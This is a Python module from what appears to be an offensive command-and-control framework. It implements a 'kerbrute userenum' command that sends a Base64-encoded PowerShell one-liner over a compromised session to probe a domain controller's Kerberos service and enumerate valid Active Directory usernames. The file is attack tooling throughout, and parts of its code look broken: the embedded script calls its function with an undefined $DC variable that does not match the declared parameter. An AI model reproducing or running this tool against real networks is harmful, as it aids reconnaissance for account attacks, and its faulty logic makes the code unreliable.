import argparse
import base64
import os
import sys

from core.gunnershell.commands.base import register, Command, connection_builder
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("kerbrute userenum")
class KerbruteUserenumCommand(Command):
	"""Perform Kerberos user enumeration via kerbrute"""

	@property
	def help(self):
		return ("kerbrute userenum -u <user|userfile|user1,user2> "
				"-d <domain> --dc-ip <ip>")

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="kerbrute userenum", add_help=False)
		parser.add_argument("-u", dest="user",    required=True, help="Single user, file, or comma-list of users")
		parser.add_argument("-d", dest="domain",  required=True, help="Target AD domain (FQDN)")
		parser.add_argument("--dc-ip", dest="dc_ip", required=False, help="IP address of the Domain Controller")

		try:
			opts = parser.parse_args(args)

		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			sid    = self.gs.sid,
			domain = opts.domain,
			dc_ip  = opts.dc_ip,
			user   = opts.user,
			op_id  = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)
		else:
			print(brightred + "[!] No output")

	def logic(self, sid, domain=None, dc_ip=None, user=None, op_id="console"):
		"""
		kerbrute userenum -d <domain> [--dc‑ip <ip>] -u <user|userfile|user1,user2>
		-d: target AD domain (FQDN)
		--dc‑ip: domain controller IP (optional)
		-u: single username, comma‑list, or file of usernames
		"""
		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"
		transport = sess.transport.lower()

		if not (dc_ip and domain):
			return brightred + "[!] You must use both --dc-ip and -d flags"

		target = dc_ip or None
		if target:
			dns_preamble = connection_builder(dc_ip)
			if dns_preamble == "ERROR":
				return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

		# build list of candidates locally
		if os.path.exists(user or ""):
			with open(user) as f:
				raw = [l.strip() for l in f if l.strip()]
			if len(raw) == 1 and ',' in raw[0]:
				users = [u.strip() for u in raw[0].split(',') if u.strip()]
			else:
				users = raw
		else:
			users = [u.strip() for u in (user or "").split(',') if u.strip()]

		escaped = [u.replace("'", "''") for u in users]
		literal_users = ", ".join(f"'{u}'" for u in escaped)

		ps = f"""
$ErrorActionPreference = 'Stop'
{dns_preamble}
$Domain = '{domain}'

# preload assemblies (harmless if not found)
try {{ [Reflection.Assembly]::LoadWithPartialName('System.Net.Security') | Out-Null }} catch {{}}
try {{ [Reflection.Assembly]::LoadWithPartialName('System')               | Out-Null }} catch {{}}

function Test-KerberosUser {{
	param($User, $Domain, $nb)

	$tcp    = New-Object System.Net.Sockets.TcpClient($nb, 88)
	$stream = $tcp.GetStream()
	$negot  = New-Object System.Net.Security.NegotiateStream($stream, $false)

	try {{
		$cred = New-Object System.Net.NetworkCredential($User, '', $Domain)
		$negot.AuthenticateAsClient($cred, "krbtgt/$Domain")
		return $false
	}}
	catch [System.Security.Authentication.InvalidCredentialException] {{
		# wrong password but valid user
		return $true
	}}
	catch [System.IO.IOException] {{
		return $false
	}}
	catch {{
		return $false
	}}
	finally {{
		if ($negot) {{ $negot.Dispose() }}
		if ($tcp)   {{ $tcp.Close() }}
	}}
}}

# enumerate
$users = @({literal_users})
foreach ($u in $users) {{
	if (Test-KerberosUser -User $u -Domain $Domain -DC $DC) {{
		Write-Output "Valid username found: $u"
	}} else {{
		Write-Output "Nothing Found"
	}}
}}
"""

		# inline Base64 + dispatch
		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
			"$ps = [System.Text.Encoding]::Unicode"
			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
			"Invoke-Expression $ps"
		)
	
		if transport in ("http", "https"):
			out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

		elif transport in ("tcp", "tls"):
			out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

		else:
			return brightred + "[!] Unknown session transport!"

		if out:
			# grab only the successful hits
			hits = [
				line for line in out.splitlines()
				if line.startswith("Valid username found:")
			]
			if hits:
				return "\n".join(hits)

			return brightred + "[!] No valid users found!"